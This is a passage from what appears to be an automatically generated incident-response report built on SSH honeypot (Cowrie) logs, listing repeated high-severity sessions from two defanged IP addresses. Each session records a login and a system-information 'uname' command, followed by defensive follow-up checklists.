- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9254b0c464bd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:41 |
| **Last Seen** | 2026-07-30 16:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:41:42` | `cowrie.session.connect` |
| `2026-07-30 16:41:43` | `cowrie.client.version` |
| `2026-07-30 16:41:43` | `cowrie.client.kex` |
| `2026-07-30 16:41:43` | `cowrie.login.success` |
| `2026-07-30 16:41:44` | `cowrie.session.params` |
| `2026-07-30 16:41:44` | `cowrie.command.input` |
| `2026-07-30 16:41:45` | `cowrie.log.closed` |
| `2026-07-30 16:41:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a60b3a7f99a5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:41 |
| **Last Seen** | 2026-07-30 16:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:41:48` | `cowrie.session.connect` |
| `2026-07-30 16:41:48` | `cowrie.client.version` |
| `2026-07-30 16:41:48` | `cowrie.client.kex` |
| `2026-07-30 16:41:49` | `cowrie.login.success` |
| `2026-07-30 16:41:50` | `cowrie.session.params` |
| `2026-07-30 16:41:50` | `cowrie.command.input` |
| `2026-07-30 16:41:50` | `cowrie.log.closed` |
| `2026-07-30 16:41:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3e178ef083e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:41 |
| **Last Seen** | 2026-07-30 16:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:41:54` | `cowrie.session.connect` |
| `2026-07-30 16:41:54` | `cowrie.client.version` |
| `2026-07-30 16:41:54` | `cowrie.client.kex` |
| `2026-07-30 16:41:54` | `cowrie.login.success` |
| `2026-07-30 16:41:55` | `cowrie.session.params` |
| `2026-07-30 16:41:55` | `cowrie.command.input` |
| `2026-07-30 16:41:55` | `cowrie.log.closed` |
| `2026-07-30 16:41:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-940e92db6da0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:42 |
| **Last Seen** | 2026-07-30 16:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:42:00` | `cowrie.session.connect` |
| `2026-07-30 16:42:00` | `cowrie.client.version` |
| `2026-07-30 16:42:00` | `cowrie.client.kex` |
| `2026-07-30 16:42:01` | `cowrie.login.success` |
| `2026-07-30 16:42:02` | `cowrie.session.params` |
| `2026-07-30 16:42:02` | `cowrie.command.input` |
| `2026-07-30 16:42:02` | `cowrie.log.closed` |
| `2026-07-30 16:42:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dee22aa9c1a1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:42 |
| **Last Seen** | 2026-07-30 16:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:42:06` | `cowrie.session.connect` |
| `2026-07-30 16:42:06` | `cowrie.client.version` |
| `2026-07-30 16:42:06` | `cowrie.client.kex` |
| `2026-07-30 16:42:06` | `cowrie.login.success` |
| `2026-07-30 16:42:07` | `cowrie.session.params` |
| `2026-07-30 16:42:07` | `cowrie.command.input` |
| `2026-07-30 16:42:07` | `cowrie.log.closed` |
| `2026-07-30 16:42:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c84496443776

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:42 |
| **Last Seen** | 2026-07-30 16:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:42:11` | `cowrie.session.connect` |
| `2026-07-30 16:42:12` | `cowrie.client.version` |
| `2026-07-30 16:42:12` | `cowrie.client.kex` |
| `2026-07-30 16:42:12` | `cowrie.login.success` |
| `2026-07-30 16:42:13` | `cowrie.session.params` |
| `2026-07-30 16:42:13` | `cowrie.command.input` |
| `2026-07-30 16:42:13` | `cowrie.log.closed` |
| `2026-07-30 16:42:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ea4642959fa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:42 |
| **Last Seen** | 2026-07-30 16:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:42:17` | `cowrie.session.connect` |
| `2026-07-30 16:42:17` | `cowrie.client.version` |
| `2026-07-30 16:42:17` | `cowrie.client.kex` |
| `2026-07-30 16:42:17` | `cowrie.login.success` |
| `2026-07-30 16:42:19` | `cowrie.session.params` |
| `2026-07-30 16:42:19` | `cowrie.command.input` |
| `2026-07-30 16:42:19` | `cowrie.log.closed` |
| `2026-07-30 16:42:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28923e4edd92

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:42 |
| **Last Seen** | 2026-07-30 16:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:42:23` | `cowrie.session.connect` |
| `2026-07-30 16:42:23` | `cowrie.client.version` |
| `2026-07-30 16:42:23` | `cowrie.client.kex` |
| `2026-07-30 16:42:23` | `cowrie.login.success` |
| `2026-07-30 16:42:24` | `cowrie.session.params` |
| `2026-07-30 16:42:24` | `cowrie.command.input` |
| `2026-07-30 16:42:24` | `cowrie.log.closed` |
| `2026-07-30 16:42:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3cf22a1aa5e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:42 |
| **Last Seen** | 2026-07-30 16:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:42:28` | `cowrie.session.connect` |
| `2026-07-30 16:42:28` | `cowrie.client.version` |
| `2026-07-30 16:42:28` | `cowrie.client.kex` |
| `2026-07-30 16:42:29` | `cowrie.login.success` |
| `2026-07-30 16:42:30` | `cowrie.session.params` |
| `2026-07-30 16:42:30` | `cowrie.command.input` |
| `2026-07-30 16:42:30` | `cowrie.log.closed` |
| `2026-07-30 16:42:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f18fde7483a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:42 |
| **Last Seen** | 2026-07-30 16:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:42:35` | `cowrie.session.connect` |
| `2026-07-30 16:42:35` | `cowrie.client.version` |
| `2026-07-30 16:42:35` | `cowrie.client.kex` |
| `2026-07-30 16:42:35` | `cowrie.login.success` |
| `2026-07-30 16:42:36` | `cowrie.session.params` |
| `2026-07-30 16:42:36` | `cowrie.command.input` |
| `2026-07-30 16:42:36` | `cowrie.log.closed` |
| `2026-07-30 16:42:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f62b04516ef

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:42 |
| **Last Seen** | 2026-07-30 16:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:42:40` | `cowrie.session.connect` |
| `2026-07-30 16:42:40` | `cowrie.client.version` |
| `2026-07-30 16:42:40` | `cowrie.client.kex` |
| `2026-07-30 16:42:41` | `cowrie.login.success` |
| `2026-07-30 16:42:42` | `cowrie.session.params` |
| `2026-07-30 16:42:42` | `cowrie.command.input` |
| `2026-07-30 16:42:42` | `cowrie.log.closed` |
| `2026-07-30 16:42:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-576bdbe5199f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:42 |
| **Last Seen** | 2026-07-30 16:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:42:46` | `cowrie.session.connect` |
| `2026-07-30 16:42:46` | `cowrie.client.version` |
| `2026-07-30 16:42:46` | `cowrie.client.kex` |
| `2026-07-30 16:42:47` | `cowrie.login.success` |
| `2026-07-30 16:42:48` | `cowrie.session.params` |
| `2026-07-30 16:42:48` | `cowrie.command.input` |
| `2026-07-30 16:42:48` | `cowrie.log.closed` |
| `2026-07-30 16:42:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9d60898d2d5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:42 |
| **Last Seen** | 2026-07-30 16:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:42:52` | `cowrie.session.connect` |
| `2026-07-30 16:42:52` | `cowrie.client.version` |
| `2026-07-30 16:42:52` | `cowrie.client.kex` |
| `2026-07-30 16:42:52` | `cowrie.login.success` |
| `2026-07-30 16:42:53` | `cowrie.session.params` |
| `2026-07-30 16:42:53` | `cowrie.command.input` |
| `2026-07-30 16:42:53` | `cowrie.log.closed` |
| `2026-07-30 16:42:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d30e5124073

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:42 |
| **Last Seen** | 2026-07-30 16:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:42:57` | `cowrie.session.connect` |
| `2026-07-30 16:42:57` | `cowrie.client.version` |
| `2026-07-30 16:42:57` | `cowrie.client.kex` |
| `2026-07-30 16:42:58` | `cowrie.login.success` |
| `2026-07-30 16:42:59` | `cowrie.session.params` |
| `2026-07-30 16:42:59` | `cowrie.command.input` |
| `2026-07-30 16:42:59` | `cowrie.log.closed` |
| `2026-07-30 16:42:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48fe4d05fbdc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:43 |
| **Last Seen** | 2026-07-30 16:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:43:03` | `cowrie.session.connect` |
| `2026-07-30 16:43:03` | `cowrie.client.version` |
| `2026-07-30 16:43:03` | `cowrie.client.kex` |
| `2026-07-30 16:43:04` | `cowrie.login.success` |
| `2026-07-30 16:43:04` | `cowrie.session.params` |
| `2026-07-30 16:43:04` | `cowrie.command.input` |
| `2026-07-30 16:43:05` | `cowrie.log.closed` |
| `2026-07-30 16:43:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82179243d3a8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:43 |
| **Last Seen** | 2026-07-30 16:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:43:08` | `cowrie.session.connect` |
| `2026-07-30 16:43:09` | `cowrie.client.version` |
| `2026-07-30 16:43:09` | `cowrie.client.kex` |
| `2026-07-30 16:43:09` | `cowrie.login.success` |
| `2026-07-30 16:43:11` | `cowrie.session.params` |
| `2026-07-30 16:43:11` | `cowrie.command.input` |
| `2026-07-30 16:43:11` | `cowrie.log.closed` |
| `2026-07-30 16:43:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f52f70d11a07

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:43 |
| **Last Seen** | 2026-07-30 16:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:43:14` | `cowrie.session.connect` |
| `2026-07-30 16:43:14` | `cowrie.client.version` |
| `2026-07-30 16:43:14` | `cowrie.client.kex` |
| `2026-07-30 16:43:16` | `cowrie.login.success` |
| `2026-07-30 16:43:17` | `cowrie.session.params` |
| `2026-07-30 16:43:17` | `cowrie.command.input` |
| `2026-07-30 16:43:17` | `cowrie.log.closed` |
| `2026-07-30 16:43:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c498c85a45a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:43 |
| **Last Seen** | 2026-07-30 16:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:43:20` | `cowrie.session.connect` |
| `2026-07-30 16:43:20` | `cowrie.client.version` |
| `2026-07-30 16:43:20` | `cowrie.client.kex` |
| `2026-07-30 16:43:21` | `cowrie.login.success` |
| `2026-07-30 16:43:22` | `cowrie.session.params` |
| `2026-07-30 16:43:22` | `cowrie.command.input` |
| `2026-07-30 16:43:22` | `cowrie.log.closed` |
| `2026-07-30 16:43:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d16e1664127

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:43 |
| **Last Seen** | 2026-07-30 16:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:43:26` | `cowrie.session.connect` |
| `2026-07-30 16:43:26` | `cowrie.client.version` |
| `2026-07-30 16:43:26` | `cowrie.client.kex` |
| `2026-07-30 16:43:27` | `cowrie.login.success` |
| `2026-07-30 16:43:28` | `cowrie.session.params` |
| `2026-07-30 16:43:28` | `cowrie.command.input` |
| `2026-07-30 16:43:28` | `cowrie.log.closed` |
| `2026-07-30 16:43:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4f87c9769ba

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:43 |
| **Last Seen** | 2026-07-30 16:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:43:32` | `cowrie.session.connect` |
| `2026-07-30 16:43:33` | `cowrie.client.version` |
| `2026-07-30 16:43:33` | `cowrie.client.kex` |
| `2026-07-30 16:43:34` | `cowrie.login.success` |
| `2026-07-30 16:43:35` | `cowrie.session.params` |
| `2026-07-30 16:43:35` | `cowrie.command.input` |
| `2026-07-30 16:43:35` | `cowrie.log.closed` |
| `2026-07-30 16:43:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11e220ec51f9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:43 |
| **Last Seen** | 2026-07-30 16:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:43:38` | `cowrie.session.connect` |
| `2026-07-30 16:43:39` | `cowrie.client.version` |
| `2026-07-30 16:43:39` | `cowrie.client.kex` |
| `2026-07-30 16:43:40` | `cowrie.login.success` |
| `2026-07-30 16:43:41` | `cowrie.session.params` |
| `2026-07-30 16:43:41` | `cowrie.command.input` |
| `2026-07-30 16:43:42` | `cowrie.log.closed` |
| `2026-07-30 16:43:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb7ae6ff0875

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:43 |
| **Last Seen** | 2026-07-30 16:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:43:45` | `cowrie.session.connect` |
| `2026-07-30 16:43:45` | `cowrie.client.version` |
| `2026-07-30 16:43:45` | `cowrie.client.kex` |
| `2026-07-30 16:43:47` | `cowrie.login.success` |
| `2026-07-30 16:43:48` | `cowrie.session.params` |
| `2026-07-30 16:43:48` | `cowrie.command.input` |
| `2026-07-30 16:43:48` | `cowrie.log.closed` |
| `2026-07-30 16:43:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d042f8274fce

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:43 |
| **Last Seen** | 2026-07-30 16:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:43:51` | `cowrie.session.connect` |
| `2026-07-30 16:43:51` | `cowrie.client.version` |
| `2026-07-30 16:43:51` | `cowrie.client.kex` |
| `2026-07-30 16:43:52` | `cowrie.login.success` |
| `2026-07-30 16:43:53` | `cowrie.session.params` |
| `2026-07-30 16:43:53` | `cowrie.command.input` |
| `2026-07-30 16:43:53` | `cowrie.log.closed` |
| `2026-07-30 16:43:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34c81ecaff0d

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-30 16:43 |
| **Last Seen** | 2026-07-30 16:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:43:56` | `cowrie.session.connect` |
| `2026-07-30 16:43:56` | `cowrie.client.version` |
| `2026-07-30 16:43:56` | `cowrie.client.kex` |
| `2026-07-30 16:43:57` | `cowrie.login.success` |
| `2026-07-30 16:43:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cbfb93020de

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-30 16:43 |
| **Last Seen** | 2026-07-30 16:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:43:56` | `cowrie.session.connect` |
| `2026-07-30 16:43:56` | `cowrie.client.version` |
| `2026-07-30 16:43:57` | `cowrie.client.kex` |
| `2026-07-30 16:43:57` | `cowrie.login.success` |
| `2026-07-30 16:43:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cd2192ebc2e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:43 |
| **Last Seen** | 2026-07-30 16:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:43:57` | `cowrie.session.connect` |
| `2026-07-30 16:43:57` | `cowrie.client.version` |
| `2026-07-30 16:43:57` | `cowrie.client.kex` |
| `2026-07-30 16:43:58` | `cowrie.login.success` |
| `2026-07-30 16:43:59` | `cowrie.session.params` |
| `2026-07-30 16:43:59` | `cowrie.command.input` |
| `2026-07-30 16:44:00` | `cowrie.log.closed` |
| `2026-07-30 16:44:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
